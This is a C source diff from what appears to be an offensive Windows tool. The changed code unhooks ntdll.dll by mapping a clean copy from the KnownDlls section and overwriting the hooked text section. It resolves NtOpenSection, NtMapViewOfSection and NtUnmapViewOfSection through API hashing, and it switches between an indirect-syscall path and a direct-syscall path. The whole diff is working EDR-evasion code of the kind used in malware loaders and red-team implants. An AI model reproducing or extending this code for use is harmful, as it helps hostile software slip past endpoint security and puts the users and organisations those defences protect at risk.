@@ -36,33 +36,21 @@ BOOL MapNtdllFromKnownDlls(OUT PVOID* ppNtdllBuf) {
         NULL
     );
 
-    // getting NtOpenSection address
-#ifdef HW_INDIRECT_SYSCALL
-    NtOpenSection_t pNtOpenSection = (NtOpenSection_t)PrepareSyscallHash(NtOpenSection_JOAA);
-#else
-    fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddressH(LoadLibrary("ntdll.dll"), NtOpenSection_JOAA);
-#endif
 
-    // getting the handle of ntdll.dll from KnownDlls
-    STATUS = pNtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjAtr);
+#ifdef SYSCALL_ENABLED
+    // getting NtOpenSection address
+    STATUS = NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjAtr);
     if (STATUS != 0x00) {
         DebugPrint("[!] NtOpenSection Failed With Error : 0x%08X \n", (unsigned int)STATUS);
         goto _EndOfFunc;
     }
 
     // mapping the view of file of ntdll.dll
-#ifdef HW_INDIRECT_SYSCALL
-    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)PrepareSyscallHash(NtMapViewOfSection_JOAA);
-    if (pNtMapViewOfSection == NULL) {
-        DebugPrint("[!] Failed to resolve NtMapViewOfSection via PrepareSyscallHash\n");
-        goto _EndOfFunc;
-    }
-
     PVOID BaseAddress = NULL; // Initialize to NULL to let the OS decide
     SIZE_T ViewSize = 0;      // Entire section
     LARGE_INTEGER SectionOffset = { 0 };
 
-    NTSTATUS Status = pNtMapViewOfSection(
+    NTSTATUS Status = NtMapViewOfSection(
         hSection,
         GetCurrentProcess(),
         &pNtdllBuffer,
@@ -79,6 +67,15 @@ BOOL MapNtdllFromKnownDlls(OUT PVOID* ppNtdllBuf) {
         goto _EndOfFunc;
     }
 #else
+    fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddressH(LoadLibrary("ntdll.dll"), NtOpenSection_JOAA);
+
+    // getting the handle of ntdll.dll from KnownDlls
+    STATUS = pNtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjAtr);
+    if (STATUS != 0x00) {
+        DebugPrint("[!] NtOpenSection Failed With Error : 0x%08X \n", (unsigned int)STATUS);
+        goto _EndOfFunc;
+    }
+
     pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
     if (pNtdllBuffer == NULL) {
         DebugPrint("[!] MapViewOfFile Failed With Error : %ld \n", GetLastError());
@@ -113,14 +110,8 @@ BOOL UnhookNtdllTextSectionViaKnownDlls() {
     }
     DebugPrint("[i] Ntdll Text Section Replaced \n");
 
-#ifdef HW_INDIRECT_SYSCALL
-    NtUnmapViewOfSection_t pNtUnmapViewOfSection = (NtUnmapViewOfSection_t)PrepareSyscallHash(NtUnmapViewOfSection_JOAA);
-    if (pNtUnmapViewOfSection == NULL) {
-        DebugPrint("[!] Failed to resolve NtUnmapViewOfSection via PrepareSyscallHash\n");
-        return FALSE;
-    }
-
-    NTSTATUS status = pNtUnmapViewOfSection(GetCurrentProcess(), pUnhookedNtdll);
+#ifdef SYSCALL_ENABLED
+    NTSTATUS status = NtUnmapViewOfSection(GetCurrentProcess(), pUnhookedNtdll);
     if (!NT_SUCCESS(status)) {
         DebugPrint("[!] NtUnmapViewOfSection Failed With Error: 0x%08X\n", status);
         return FALSE;
